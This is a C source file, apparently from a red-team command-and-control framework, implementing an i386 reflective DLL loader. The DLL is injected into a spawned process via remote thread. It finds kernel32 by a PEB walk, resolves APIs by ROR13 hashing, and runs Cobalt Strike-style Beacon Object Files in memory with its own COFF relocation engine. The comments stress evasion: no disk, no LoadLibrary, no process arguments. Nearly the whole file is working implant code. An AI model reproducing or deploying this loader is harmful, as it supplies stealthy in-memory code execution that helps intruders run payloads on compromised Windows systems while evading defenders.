/*
 * loader.c — slice 1.d phase B-bis (reflective-DLL model).
 *
 * Compiled as a regular i386 DLL with relocations preserved. The
 * parent Go orchestrator parses the PE header, VirtualAllocEx's
 * a single image-sized region inside a freshly-spawned WoW64 host,
 * WriteProcessMemory's each section at its RVA, applies the
 * .reloc table against the new image base, VirtualProtectEx's
 * section protections, then CreateRemoteThread targets the
 * exported BOFExec address.
 *
 * No disk, no LoadLibrary, no rundll32 argv. Pattern is
 * Stephen-Fewer-style manual reflective loading; the loader DLL
 * doesn't need a reflective stub of its own because the parent
 * applies relocations from the outside.
 *
 * The DLL has no static imports beyond kernel32 — we resolve
 * everything via PEB walk + ROR13 at run time because the manual
 * mapping bypasses the OS PE loader's import resolution.
 *
 * Inside the DLL:
 *   - DllMain: returns TRUE (never actually invoked — manual map
 *     skips the entry point in the optional header).
 *   - BOFExec(loader_params_t *p): the CreateRemoteThread target.
 *     Validates the params block, walks PEB to find kernel32,
 *     resolves the kernel32 API set via ROR13, parses the BOF .o
 *     out of params->bof_addr, copies sections, applies relocations
 *     (DIR32 / DIR32NB / REL32 / ABSOLUTE for i386 BOFs), then
 *     calls the BOF's "go" entry cdecl with (args, args_len).
 *
 * The Beacon API surface (BeaconPrintf / BeaconOutput / etc.) is
 * implemented inside this DLL — external __imp__Beacon* symbols
 * in the BOF resolve to in-DLL function pointers via ROR13
 * hashing of the symbol name (with the i386 leading `_` + the
 * `__imp_` indirect prefix stripped).
 *
 * Build (maintainer only — `go build` ships the .dll bytes via
 * go:embed):
 *
 *   bash scripts/build-bof-x86-loader.sh
 */

#include <windows.h>
#include <stdint.h>

/* windows.h defines RtlMoveMemory as a #define for memmove on
 * mingw32, which collides with our function-pointer field. Undef
 * here; we use the resolved kernel32!RtlMoveMemory directly. */
#ifdef RtlMoveMemory
#undef RtlMoveMemory
#endif

#include "abi.h"

/* — Globals --------------------------------------------------------
 *
 * Set once by BOFExec on entry; read by every Beacon API stub.
 * Safe because manual mapping applies relocations against the
 * DLL's .data section before CreateRemoteThread fires, and the
 * loader is single-threaded per child process. */

static loader_params_t *g_params = 0;

typedef void  __stdcall (*pfn_ExitThread)(uint32_t code);
typedef void *__stdcall (*pfn_VirtualAlloc)(void *addr, uint32_t size, uint32_t allocType, uint32_t protect);
typedef int   __stdcall (*pfn_VirtualProtect)(void *addr, uint32_t size, uint32_t newProtect, uint32_t *oldProtect);
typedef void *__stdcall (*pfn_GetProcessHeap)(void);
typedef void *__stdcall (*pfn_HeapAlloc)(void *heap, uint32_t flags, uint32_t bytes);
typedef int   __stdcall (*pfn_HeapFree)(void *heap, uint32_t flags, void *mem);
typedef void  __stdcall (*pfn_RtlMoveMemory)(void *dst, const void *src, uint32_t len);

typedef struct {
    pfn_ExitThread      ExitThread;
    pfn_VirtualAlloc    VirtualAlloc;
    pfn_VirtualProtect  VirtualProtect;
    pfn_GetProcessHeap  GetProcessHeap;
    pfn_HeapAlloc       HeapAlloc;
    pfn_HeapFree        HeapFree;
    pfn_RtlMoveMemory   RtlMoveMemory;
} kernel32_api_t;

static kernel32_api_t g_kapi;

/* — Hash + PEB walk (kept from the flat-PIC version) ------------- */

#define HASH_EXIT_THREAD          0x60E0CEEFu
#define HASH_VIRTUAL_ALLOC        0x91AFCA54u
#define HASH_VIRTUAL_PROTECT      0x7946C61Bu
#define HASH_GET_PROCESS_HEAP     0xA80EECAEu
#define HASH_HEAP_ALLOC           0x2500383Cu
#define HASH_HEAP_FREE            0x10C32616u
#define HASH_RTL_MOVE_MEMORY      0xCF14E85Bu

static uint32_t ror13_hash(const uint8_t *s)
{
    uint32_t h = 0;
    while (*s) {
        h = ((h >> 13) | (h << 19)) + (uint32_t)*s;
        s++;
    }
    return h;
}

static inline uint32_t get_peb32(void)
{
    uint32_t peb;
    __asm__ volatile ("mov %0, fs:0x30" : "=r"(peb));
    return peb;
}

static uint32_t find_kernel32_base(void)
{
    uint32_t peb = get_peb32();
    uint32_t ldr = *(uint32_t *)(peb + 0x0C);
    uint32_t e   = *(uint32_t *)(ldr + 0x14);
    e = *(uint32_t *)e;
    e = *(uint32_t *)e;
    return *(uint32_t *)(e + 0x10);
}

static uint32_t resolve_by_hash(uint32_t module_base, uint32_t wanted)
{
    uint8_t *base = (uint8_t *)module_base;
    uint32_t pe = *(uint32_t *)(base + 0x3C);
    uint32_t exp_rva = *(uint32_t *)(base + pe + 0x78);
    if (!exp_rva) return 0;
    uint8_t *exp_dir = base + exp_rva;
    uint32_t n_names   = *(uint32_t *)(exp_dir + 0x18);
    uint32_t names_rva = *(uint32_t *)(exp_dir + 0x20);
    uint32_t funcs_rva = *(uint32_t *)(exp_dir + 0x1C);
    uint32_t ords_rva  = *(uint32_t *)(exp_dir + 0x24);
    uint32_t *names = (uint32_t *)(base + names_rva);
    uint32_t *funcs = (uint32_t *)(base + funcs_rva);
    uint16_t *ords  = (uint16_t *)(base + ords_rva);
    for (uint32_t i = 0; i < n_names; i++) {
        if (ror13_hash(base + names[i]) == wanted) {
            return (uint32_t)(base + funcs[ords[i]]);
        }
    }
    return 0;
}

static int resolve_kapi(uint32_t k32, kernel32_api_t *k)
{
    k->ExitThread     = (pfn_ExitThread)    resolve_by_hash(k32, HASH_EXIT_THREAD);
    k->VirtualAlloc   = (pfn_VirtualAlloc)  resolve_by_hash(k32, HASH_VIRTUAL_ALLOC);
    k->VirtualProtect = (pfn_VirtualProtect)resolve_by_hash(k32, HASH_VIRTUAL_PROTECT);
    k->GetProcessHeap = (pfn_GetProcessHeap)resolve_by_hash(k32, HASH_GET_PROCESS_HEAP);
    k->HeapAlloc      = (pfn_HeapAlloc)     resolve_by_hash(k32, HASH_HEAP_ALLOC);
    k->HeapFree       = (pfn_HeapFree)      resolve_by_hash(k32, HASH_HEAP_FREE);
    k->RtlMoveMemory  = (pfn_RtlMoveMemory) resolve_by_hash(k32, HASH_RTL_MOVE_MEMORY);
    return k->ExitThread && k->VirtualAlloc && k->VirtualProtect
        && k->GetProcessHeap && k->HeapAlloc && k->HeapFree
        && k->RtlMoveMemory;
}

/* — Beacon API surface (step 1.c minimal) ------------------------- */

#define HASH_BEACON_PRINTF   0x4D33ED28u
#define HASH_BEACON_OUTPUT   0xD3F1C32Au
#define HASH_BEACON_ERROR_D  0xD42BEA52u
#define HASH_BEACON_ERROR_DD 0x0A1A5E16u
#define HASH_BEACON_ERROR_NA 0x46DAB1ABu

static uint32_t cstr_len(const char *s)
{
    uint32_t n = 0;
    while (s[n] != '\0') n++;
    return n;
}

static void append_out(const void *src, uint32_t n)
{
    if (n == 0 || !g_params) return;
    uint32_t room = g_params->out_cap - g_params->out_len;
    if (room == 0) return;
    if (n > room) n = room;
    g_kapi.RtlMoveMemory((uint8_t *)(g_params->out_addr + g_params->out_len), src, n);
    g_params->out_len += n;
}

static void append_err(const void *src, uint32_t n)
{
    if (n == 0 || !g_params) return;
    uint32_t room = g_params->err_cap - g_params->err_len;
    if (room == 0) return;
    if (n > room) n = room;
    g_kapi.RtlMoveMemory((uint8_t *)(g_params->err_addr + g_params->err_len), src, n);
    g_params->err_len += n;
}

/* BeaconPrintf — minimal: treats fmt as a literal NUL-terminated
 * string, no varargs expansion. Matches the x64 loader's default
 * behaviour (option (a) in docs/techniques/runtime/bof-loader.md);
 * BOFs that pass a literal format see correct output, those that
 * rely on `%`-expansion see the raw template. Step 1.c.2 will add
 * a tiny printf engine. */
__declspec(dllexport) void __cdecl BeaconPrintf(int type, const char *fmt)
{
    (void)type;
    if (!fmt) return;
    append_out(fmt, cstr_len(fmt));
}

__declspec(dllexport) void __cdecl BeaconOutput(int type, const char *data, int len)
{
    (void)type;
    if (!data || len <= 0) return;
    append_out(data, (uint32_t)len);
}

__declspec(dllexport) void __cdecl BeaconErrorD(int code, int v1)
{
    (void)code; (void)v1;
    char dot = '.';
    append_err(&dot, 1);
}

__declspec(dllexport) void __cdecl BeaconErrorDD(int code, int v1, int v2)
{
    (void)code; (void)v1; (void)v2;
    char dot = '.';
    append_err(&dot, 1);
}

__declspec(dllexport) void __cdecl BeaconErrorNA(int code)
{
    (void)code;
    char dot = '.';
    append_err(&dot, 1);
}

static uint32_t beacon_resolve(uint32_t hash)
{
    if (hash == HASH_BEACON_PRINTF)   return (uint32_t)&BeaconPrintf;
    if (hash == HASH_BEACON_OUTPUT)   return (uint32_t)&BeaconOutput;
    if (hash == HASH_BEACON_ERROR_D)  return (uint32_t)&BeaconErrorD;
    if (hash == HASH_BEACON_ERROR_DD) return (uint32_t)&BeaconErrorDD;
    if (hash == HASH_BEACON_ERROR_NA) return (uint32_t)&BeaconErrorNA;
    return 0;
}

/* — COFF i386 parser + relocation engine ------------------------- */

#define MAX_SECTIONS 32

/* IMAGE_SCN_MEM_EXECUTE + IMAGE_REL_I386_* come from winnt.h. */

#define COFF_HEADER_SIZE   20
#define COFF_SECTION_SIZE  40
#define COFF_RELOC_SIZE    10
#define COFF_SYMBOL_SIZE   18

#define HDR_MACHINE_OFF            0
#define HDR_NSECTIONS_OFF          2
#define HDR_PTR_SYMTAB_OFF         8
#define HDR_NSYMBOLS_OFF          12
#define HDR_SIZEOF_OPT_HDR_OFF    16

#define SEC_NAME_OFF               0
#define SEC_SIZE_OF_RAW_DATA_OFF  16
#define SEC_PTR_TO_RAW_DATA_OFF   20
#define SEC_PTR_TO_RELOCS_OFF     24
#define SEC_NUMBER_OF_RELOCS_OFF  32
#define SEC_CHARACTERISTICS_OFF   36

#define REL_VIRTUAL_ADDR_OFF       0
#define REL_SYMBOL_TBL_INDEX_OFF   4
#define REL_TYPE_OFF               8

#define SYM_NAME_OFF               0
#define SYM_VALUE_OFF              8
#define SYM_SECTION_NUMBER_OFF    12
#define SYM_NUMBER_OF_AUX_OFF     17

static inline uint16_t le16(const uint8_t *p) { return *(uint16_t *)p; }
static inline uint32_t le32(const uint8_t *p) { return *(uint32_t *)p; }
static inline void le32_put(uint8_t *p, uint32_t v) { *(uint32_t *)p = v; }

/* sym_name_at returns a pointer to the symbol name — short name
 * inline in the 8-byte field, or a string-table entry via the
 * long-name 8-byte form (first 4 bytes zero, next 4 bytes are
 * offset into string table). */
static const uint8_t *sym_name_at(const uint8_t *sym, const uint8_t *bof, uint32_t string_tbl_off)
{
    if (le32(sym + SYM_NAME_OFF) != 0) {
        return sym;  /* short name — caller compares up to 8 bytes or to NUL */
    }
    return bof + string_tbl_off + le32(sym + SYM_NAME_OFF + 4);
}

static uint32_t name_eq_underscore_go(const uint8_t *sym, const uint8_t *bof, uint32_t string_tbl_off)
{
    const uint8_t *name = sym_name_at(sym, bof, string_tbl_off);
    if (le32(sym + SYM_NAME_OFF) != 0) {
        /* short name: _go followed by NUL inside the 8-byte field */
        return name[0] == '_' && name[1] == 'g' && name[2] == 'o' && name[3] == 0;
    }
    return name[0] == '_' && name[1] == 'g' && name[2] == 'o' && name[3] == 0;
}

/* Hash an i386 external symbol name to look it up in the Beacon
 * table. The name on the wire looks like `__imp__BeaconPrintf`:
 *   - `__imp_` is the MSVC indirect-import prefix
 *   - `_BeaconPrintf` is the i386 C name (leading underscore)
 * We strip both prefixes before hashing so the result matches the
 * canonical CS name `BeaconPrintf`. */
static uint32_t hash_extern_sym(const uint8_t *name)
{
    uint32_t h = 0;
    uint32_t i = 0;
    /* Skip up to two leading underscores from __imp_ then one
     * underscore from the i386 prefix. The canonical form starts
     * with two-or-more underscores so we can be lenient: strip
     * all leading underscores. */
    while (name[i] == '_') i++;
    /* If the remaining name starts with "imp_", skip past it. */
    if (name[i] == 'i' && name[i+1] == 'm' && name[i+2] == 'p' && name[i+3] == '_') {
        i += 4;
        while (name[i] == '_') i++;
    }
    while (name[i] != '\0') {
        h = ((h >> 13) | (h << 19)) + (uint32_t)name[i];
        i++;
    }
    return h;
}

static uint32_t exec_bof(loader_params_t *p)
{
    const uint8_t *bof = (const uint8_t *)p->bof_addr;
    uint32_t bof_len   = p->bof_len;

    if (bof_len < COFF_HEADER_SIZE) {
        p->error_code = 0x10001;
        return LOADER_STATUS_LOAD_FAIL;
    }
    if (le16(bof + HDR_MACHINE_OFF) != 0x014c) {
        p->error_code = 0x10002;
        return LOADER_STATUS_LOAD_FAIL;
    }
    uint16_t nsec = le16(bof + HDR_NSECTIONS_OFF);
    if (nsec == 0 || nsec > MAX_SECTIONS) {
        p->error_code = 0x10003;
        return LOADER_STATUS_LOAD_FAIL;
    }
    uint16_t opt_hdr_size = le16(bof + HDR_SIZEOF_OPT_HDR_OFF);
    uint32_t sec_tbl_off  = COFF_HEADER_SIZE + opt_hdr_size;
    if (sec_tbl_off + (uint32_t)nsec * COFF_SECTION_SIZE > bof_len) {
        p->error_code = 0x10004;
        return LOADER_STATUS_LOAD_FAIL;
    }

    uint32_t sym_tbl_off = le32(bof + HDR_PTR_SYMTAB_OFF);
    uint32_t n_syms      = le32(bof + HDR_NSYMBOLS_OFF);
    uint32_t string_tbl_off = sym_tbl_off + n_syms * COFF_SYMBOL_SIZE;

    /* Layout: sections back-to-back + one 4-byte import slot per
     * unique external symbol (added at the tail). The slots act
     * as the __imp__ jump table the BOF dereferences via
     * `call dword ptr [imp_slot]`. */

    /* Pass 1: total raw size + count of unique external symbols. */
    uint32_t total_raw = 0;
    for (uint16_t i = 0; i < nsec; i++) {
        const uint8_t *sh = bof + sec_tbl_off + (uint32_t)i * COFF_SECTION_SIZE;
        total_raw += le32(sh + SEC_SIZE_OF_RAW_DATA_OFF);
    }

    /* Walk relocations to enumerate unique external symbols. We
     * over-allocate one slot per relocation (each reloc references
     * at most one symbol, and unique-ifying is a separate pass).
     * Cap at 64 unique imports to keep the math sane. */
    #define MAX_UNIQUE_IMPORTS 64
    uint32_t import_sym_idx[MAX_UNIQUE_IMPORTS];
    uint32_t import_slot_off[MAX_UNIQUE_IMPORTS];
    uint32_t n_imports = 0;

    for (uint16_t i = 0; i < nsec; i++) {
        const uint8_t *sh = bof + sec_tbl_off + (uint32_t)i * COFF_SECTION_SIZE;
        uint16_t nr     = le16(sh + SEC_NUMBER_OF_RELOCS_OFF);
        uint32_t rp     = le32(sh + SEC_PTR_TO_RELOCS_OFF);
        for (uint16_t r = 0; r < nr; r++) {
            const uint8_t *re = bof + rp + (uint32_t)r * COFF_RELOC_SIZE;
            uint32_t sym_ix = le32(re + REL_SYMBOL_TBL_INDEX_OFF);
            if (sym_ix >= n_syms) {
                p->error_code = 0x10010;
                return LOADER_STATUS_LOAD_FAIL;
            }
            const uint8_t *sym = bof + sym_tbl_off + sym_ix * COFF_SYMBOL_SIZE;
            int16_t sym_sec = (int16_t)le16(sym + SYM_SECTION_NUMBER_OFF);
            if (sym_sec != 0) continue;  /* internal — handled in pass 3 */

            /* Dedup by symbol-table index (cheaper than name compare). */
            uint32_t dup = 0;
            for (uint32_t k = 0; k < n_imports; k++) {
                if (import_sym_idx[k] == sym_ix) { dup = 1; break; }
            }
            if (dup) continue;
            if (n_imports >= MAX_UNIQUE_IMPORTS) {
                p->error_code = 0x10011;
                return LOADER_STATUS_LOAD_FAIL;
            }
            import_sym_idx[n_imports] = sym_ix;
            n_imports++;
        }
    }

    uint32_t total = total_raw + n_imports * 4;
    if (total == 0 || total > 0x01000000u) {
        p->error_code = 0x10005;
        return LOADER_STATUS_LOAD_FAIL;
    }

    uint8_t *mapping = (uint8_t *)g_kapi.VirtualAlloc(
        0, total, /* MEM_COMMIT|MEM_RESERVE */ 0x3000,
        /* PAGE_READWRITE */ 0x04);
    if (!mapping) {
        p->error_code = 0x10006;
        return LOADER_STATUS_LOAD_FAIL;
    }

    /* Pass 2: copy sections, record per-section base + exec flag. */
    uint32_t section_base[MAX_SECTIONS + 1] = {0};
    uint8_t  section_exec[MAX_SECTIONS + 1] = {0};
    uint32_t cursor = 0;
    for (uint16_t i = 0; i < nsec; i++) {
        const uint8_t *sh = bof + sec_tbl_off + (uint32_t)i * COFF_SECTION_SIZE;
        uint32_t raw_size = le32(sh + SEC_SIZE_OF_RAW_DATA_OFF);
        uint32_t raw_ptr  = le32(sh + SEC_PTR_TO_RAW_DATA_OFF);
        uint32_t chars    = le32(sh + SEC_CHARACTERISTICS_OFF);
        if (raw_size == 0 || raw_ptr == 0) continue;
        if (raw_ptr + raw_size > bof_len) {
            p->error_code = 0x10007;
            return LOADER_STATUS_LOAD_FAIL;
        }
        g_kapi.RtlMoveMemory(mapping + cursor, bof + raw_ptr, raw_size);
        section_base[i + 1] = (uint32_t)(mapping + cursor);
        section_exec[i + 1] = (chars & IMAGE_SCN_MEM_EXECUTE) ? 1 : 0;
        cursor += raw_size;
    }

    /* Pass 3a: resolve external imports + populate slots. */
    uint32_t imports_base = (uint32_t)(mapping + total_raw);
    for (uint32_t k = 0; k < n_imports; k++) {
        const uint8_t *sym  = bof + sym_tbl_off + import_sym_idx[k] * COFF_SYMBOL_SIZE;
        const uint8_t *name = sym_name_at(sym, bof, string_tbl_off);
        uint32_t hash = hash_extern_sym(name);
        uint32_t addr = beacon_resolve(hash);
        if (!addr) {
            p->error_code = 0x10012;
            return LOADER_STATUS_LOAD_FAIL;
        }
        uint32_t slot_addr = imports_base + k * 4;
        *(uint32_t *)slot_addr = addr;
        import_slot_off[k] = slot_addr;
    }

    /* Pass 3b: apply relocations. */
    for (uint16_t i = 0; i < nsec; i++) {
        const uint8_t *sh = bof + sec_tbl_off + (uint32_t)i * COFF_SECTION_SIZE;
        uint16_t nr     = le16(sh + SEC_NUMBER_OF_RELOCS_OFF);
        if (nr == 0) continue;
        uint32_t rp     = le32(sh + SEC_PTR_TO_RELOCS_OFF);
        uint32_t sec_base = section_base[i + 1];
        if (sec_base == 0) continue;

        for (uint16_t r = 0; r < nr; r++) {
            const uint8_t *re = bof + rp + (uint32_t)r * COFF_RELOC_SIZE;
            uint32_t va     = le32(re + REL_VIRTUAL_ADDR_OFF);
            uint32_t sym_ix = le32(re + REL_SYMBOL_TBL_INDEX_OFF);
            uint16_t type   = le16(re + REL_TYPE_OFF);
            const uint8_t *sym = bof + sym_tbl_off + sym_ix * COFF_SYMBOL_SIZE;
            int16_t sym_sec = (int16_t)le16(sym + SYM_SECTION_NUMBER_OFF);

            uint32_t target;
            if (sym_sec > 0) {
                if ((uint32_t)sym_sec > nsec || section_base[sym_sec] == 0) {
                    p->error_code = 0x10013;
                    return LOADER_STATUS_LOAD_FAIL;
                }
                target = section_base[sym_sec] + le32(sym + SYM_VALUE_OFF);
            } else if (sym_sec == 0) {
                /* External — find slot. */
                uint32_t slot = 0;
                for (uint32_t k = 0; k < n_imports; k++) {
                    if (import_sym_idx[k] == sym_ix) { slot = import_slot_off[k]; break; }
                }
                if (!slot) {
                    p->error_code = 0x10014;
                    return LOADER_STATUS_LOAD_FAIL;
                }
                target = slot;
            } else {
                target = le32(sym + SYM_VALUE_OFF);
            }

            uint8_t *patch = (uint8_t *)(sec_base + va);
            if (type == IMAGE_REL_I386_ABSOLUTE) {
                /* no-op */
            } else if (type == IMAGE_REL_I386_DIR32) {
                le32_put(patch, target + le32(patch));
            } else if (type == IMAGE_REL_I386_REL32) {
                uint32_t pc = (uint32_t)patch + 4;
                le32_put(patch, target + le32(patch) - pc);
            } else if (type == IMAGE_REL_I386_DIR32NB) {
                le32_put(patch, target + le32(patch) - (uint32_t)mapping);
            } else {
                p->error_code = 0x10015 | ((uint32_t)type << 16);
                return LOADER_STATUS_LOAD_FAIL;
            }
        }
    }

    /* Pass 4: flip exec sections to PAGE_EXECUTE_READ. */
    for (uint16_t i = 0; i < nsec; i++) {
        if (!section_exec[i + 1] || !section_base[i + 1]) continue;
        const uint8_t *sh = bof + sec_tbl_off + (uint32_t)i * COFF_SECTION_SIZE;
        uint32_t raw_size = le32(sh + SEC_SIZE_OF_RAW_DATA_OFF);
        uint32_t old_protect = 0;
        if (!g_kapi.VirtualProtect((void *)section_base[i + 1], raw_size,
                                    /* PAGE_EXECUTE_READ */ 0x20, &old_protect)) {
            p->error_code = 0x10016;
            return LOADER_STATUS_LOAD_FAIL;
        }
    }

    /* Pass 5: find _go and call it cdecl. */
    uint32_t entry_addr = 0;
    for (uint32_t i = 0; i < n_syms; i++) {
        const uint8_t *sym = bof + sym_tbl_off + i * COFF_SYMBOL_SIZE;
        int16_t sym_sec = (int16_t)le16(sym + SYM_SECTION_NUMBER_OFF);
        if (sym_sec <= 0) {
            i += sym[SYM_NUMBER_OF_AUX_OFF];
            continue;
        }
        if (!name_eq_underscore_go(sym, bof, string_tbl_off)) {
            i += sym[SYM_NUMBER_OF_AUX_OFF];
            continue;
        }
        if ((uint32_t)sym_sec > nsec || section_base[sym_sec] == 0) {
            p->error_code = 0x10020;
            return LOADER_STATUS_LOAD_FAIL;
        }
        entry_addr = section_base[sym_sec] + le32(sym + SYM_VALUE_OFF);
        break;
    }
    if (entry_addr == 0) {
        p->error_code = 0x10021;
        return LOADER_STATUS_LOAD_FAIL;
    }

    typedef void __cdecl (*bof_entry_t)(const void *args, int32_t alen);
    ((bof_entry_t)entry_addr)((const void *)p->args_addr, (int32_t)p->args_len);

    return LOADER_STATUS_DONE;
}

/* — Entry --------------------------------------------------------- */

BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved)
{
    (void)hinst; (void)reason; (void)reserved;
    return TRUE;
}

__declspec(dllexport) uint32_t __stdcall BOFExec(loader_params_t *p)
{
    if (!p) return LOADER_STATUS_ABI_MISMATCH;

    if (p->magic != LOADER_ABI_MAGIC || p->version != LOADER_ABI_VERSION) {
        p->status = LOADER_STATUS_ABI_MISMATCH;
        p->error_code = p->magic ^ LOADER_ABI_MAGIC;
        return LOADER_STATUS_ABI_MISMATCH;
    }
    p->status = LOADER_STATUS_RUNNING;

    uint32_t k32 = find_kernel32_base();
    if (!k32) {
        p->status = LOADER_STATUS_RESOLVE_FAIL;
        return LOADER_STATUS_RESOLVE_FAIL;
    }
    if (!resolve_kapi(k32, &g_kapi)) {
        p->status = LOADER_STATUS_RESOLVE_FAIL;
        return LOADER_STATUS_RESOLVE_FAIL;
    }
    g_params = p;

    uint32_t result = exec_bof(p);
    p->status = result;

    g_kapi.ExitThread(result);
    return result;  /* unreachable */
}
